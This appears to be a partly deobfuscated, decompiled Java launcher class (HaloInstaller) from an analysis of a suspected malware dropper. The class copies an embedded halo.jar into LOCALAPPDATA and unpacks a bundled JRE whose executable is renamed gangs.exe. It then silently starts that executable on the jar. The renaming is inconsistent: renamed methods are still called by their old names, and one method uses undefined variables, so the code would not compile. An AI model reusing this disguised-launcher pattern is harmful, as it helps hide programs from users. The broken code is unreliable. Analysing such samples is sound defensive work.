/*\n * ========================================\n * DEOBFUSCATED: HaloInstaller.java\n * Original: a/d.java\n * ----------------------------------------\n * halo.jar kurulumcusu - JAR ı LOCALAPPDATA ya kopyalar, JRE yi halos/jdk/ altına kurar\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package a;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.FileAttribute;
import java.time.Instant;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class d {
    private static void logInstall(String string) {
        try {
            Object object = System.getenv("LOCALAPPDATA");
            if (object == null || ((String)object).isEmpty()) {
                object = System.getProperty("user.home") + "/AppData/Local";
            }
            File file = new File((String)object + "/halos");
            file.mkdirs();
            try (FileWriter fileWriter = new FileWriter(new File(file, "launcher.log"), true);){
                fileWriter.write(Instant.now().toString() + " " + string + "\n");
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static void main(String[] stringArray) {
        try {
            Object object = System.getenv("LOCALAPPDATA");
            if (object == null || ((String)object).isEmpty()) {
                object = System.getProperty("user.home") + "/AppData/Local";
            }
            File file = new File((String)object);
            File file2 = new File(file, "halo.jar");
            File file3 = new File(file, "halos/jdk/bin/gangs.exe");
            d.a("Launcher started");
            try (Object object2 = d.class.getResourceAsStream("/halo.jar");){
                if (object2 != null) {
                    Files.copy((InputStream)object2, file2.toPath(), StandardCopyOption.REPLACE_EXISTING);
                    d.a("halo.jar extracted to " + file2.getAbsolutePath());
                } else {
                    d.a("halo.jar resource not found");
                }
            }
            if (!file3.exists()) {
                object2 = d.class.getResourceAsStream("/app.zip");
                try {
                    if (object2 != null) {
                        d.a((InputStream)object2, file.toPath());
                        d.a("JDK extracted to " + file.getAbsolutePath());
                    }
                    d.a("app.zip resource not found");
                }
                finally {
                    if (object2 != null) {
                        ((InputStream)object2).close();
                    }
                }
            } else {
                d.a("JDK already exists, skipping app.zip extraction");
            }
            if (file3.exists()) {
                object2 = new ProcessBuilder(file3.getAbsolutePath(), "--enable-native-access=ALL-UNNAMED", "-jar", file2.getAbsolutePath());
                ((ProcessBuilder)object2).directory(file);
                ((ProcessBuilder)object2).start();
                d.a("Application spawned successfully");
            } else {
                d.a("Error: gangs.exe not found after extraction");
            }
        }
        catch (Exception exception) {
            d.a("Error: " + exception.getMessage());
            StringWriter stringWriter = new StringWriter();
            exception.printStackTrace(new PrintWriter(stringWriter));
            d.a(stringWriter.toString());
        }
        System.exit(0);
    }

    private static void copyStream(InputStream input, Path dest) throws IOException {
        try (ZipInputStream zipInputStream = new ZipInputStream(inputStream);){
            ZipEntry zipEntry;
            while ((zipEntry = zipInputStream.getNextEntry()) != null) {
                Path path2 = path.resolve(zipEntry.getName());
                if (!path2.normalize().startsWith(path.normalize())) {
                    throw new IOException("Bad zip entry: " + zipEntry.getName());
                }
                if (zipEntry.isDirectory()) {
                    Files.createDirectories(path2, new FileAttribute[0]);
                } else {
                    if (path2.getParent() != null) {
                        Files.createDirectories(path2.getParent(), new FileAttribute[0]);
                    }
                    Files.copy(zipInputStream, path2, StandardCopyOption.REPLACE_EXISTING);
                }
                zipInputStream.closeEntry();
            }
        }
    }
}

